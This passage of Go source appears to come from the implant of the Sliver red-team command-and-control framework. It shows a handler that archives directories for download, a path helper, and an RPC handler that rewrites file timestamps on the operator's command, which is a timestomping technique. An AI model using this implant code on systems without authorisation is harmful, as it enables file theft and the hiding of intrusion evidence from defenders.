				testPath := strings.ReplaceAll(filepath.Dir(file), "\\", "/") + "/"
				match, matchErr := matcher.Match(testPath+filter, filePath)
				if !match || matchErr != nil {
					// If there is an error, it is because the filter is bad, so it is not a match
					return nil
				}
				matchingFiles = append(matchingFiles, file)
			} else {
				matchingFiles = append(matchingFiles, file)
			}
			return nil
		})
	}

	return matchingFiles, nil
}

func compressDir(path string, filter string, recurse bool, buf io.Writer) (int, int, error) {
	zipWriter := gzip.NewWriter(buf)
	tarWriter := tar.NewWriter(zipWriter)
	readFiles := 0
	unreadableFiles := 0
	var matchingFiles []string

	/*
		There is an edge case where if you are trying to download a junction on Windows,
		you will get access denied

		To resolve this, we will resolve the junction or symlink before we do anything.
		Even though resolving the symlink first is not necessary on *nix, it does not hurt
		and will make it so that we do not have to detect if we are on Windows.
	*/
	pathInfo, err := os.Lstat(path)
	if err != nil {
		return readFiles, unreadableFiles, err
	}

	if pathInfo.Mode()&os.ModeSymlink == os.ModeSymlink {
		path, err = filepath.EvalSymlinks(path)
		if err != nil {
			return readFiles, unreadableFiles, err
		}
		// The path we get back from EvalSymlinks does not have a trailing separator
		// Forward slash is fine even on Windows.
		path += "/"
	}

	matchingFiles, err = buildFileList(path, filter, recurse)
	if err != nil {
		return readFiles, unreadableFiles, err
	}

	for _, file := range matchingFiles {
		fi, err := os.Stat(file)
		if err != nil {
			// Cannot get info on the file, so skip it
			unreadableFiles += 1
			continue
		}

		fileName := standarizeArchiveFileName(file)

		// If the file is a SymLink replace fileInfo and path with the symlink destination.
		if fi.Mode()&os.ModeSymlink == os.ModeSymlink {
			file, err = filepath.EvalSymlinks(file)
			if err != nil {
				unreadableFiles += 1
				continue
			}

			fi, err = os.Lstat(file)
			if err != nil {
				unreadableFiles += 1
				continue
			}
		}

		header, err := tar.FileInfoHeader(fi, file)
		if err != nil {
			unreadableFiles += 1
			continue
		}
		// Keep the symlink file path for the header name.
		header.Name = filepath.ToSlash(fileName)
		// Check that we can open the file before we try to write it to the archive
		if !fi.IsDir() {
			data, err := os.Open(file)
			if err != nil {
				// Skip this file and do not write it to the archive.
				unreadableFiles += 1
				continue
			}
			if err := tarWriter.WriteHeader(header); err != nil {
				unreadableFiles += 1
				data.Close()
				continue
			}
			if _, err := io.Copy(tarWriter, data); err != nil {
				unreadableFiles += 1
				data.Close()
				continue
			}
			data.Close()
			readFiles += 1
		} else {
			if err := tarWriter.WriteHeader(header); err != nil {
				unreadableFiles += 1
				continue
			}
		}
	}

	if err := tarWriter.Close(); err != nil {
		return readFiles, unreadableFiles, err
	}
	if err := zipWriter.Close(); err != nil {
		return readFiles, unreadableFiles, err
	}
	return readFiles, unreadableFiles, nil
}

func expandPath(exePath string) (string, error) {
	if !strings.ContainsRune(exePath, os.PathSeparator) {
		_, err := exec.LookPath(exePath)
		if err != nil {
			return filepath.Abs(exePath)
		}
	}
	return exePath, nil
}

func chtimesHandler(data []byte, resp RPCResponse) {
	chtimesReq := &sliverpb.ChtimesReq{}
	err := proto.Unmarshal(data, chtimesReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	chtimes := &sliverpb.Chtimes{}
	target, _ := filepath.Abs(chtimesReq.Path)
	chtimes.Path = target
	// Make sure file exists
	_, err = os.Stat(target)

	chtimes.Response = &commonpb.Response{}
	if err == nil {

		unixAtime := int64(chtimesReq.ATime)
		atime := time.Unix(unixAtime, 0)

		unixMtime := int64(chtimesReq.MTime)
		mtime := time.Unix(unixMtime, 0)

		err = os.Chtimes(target, atime, mtime)
		if err != nil {
			chtimes.Response.Err = err.Error()
		}

	} else {
		chtimes.Response.Err = err.Error()
	}

	data, err = proto.Marshal(chtimes)
	resp(data, err)
}
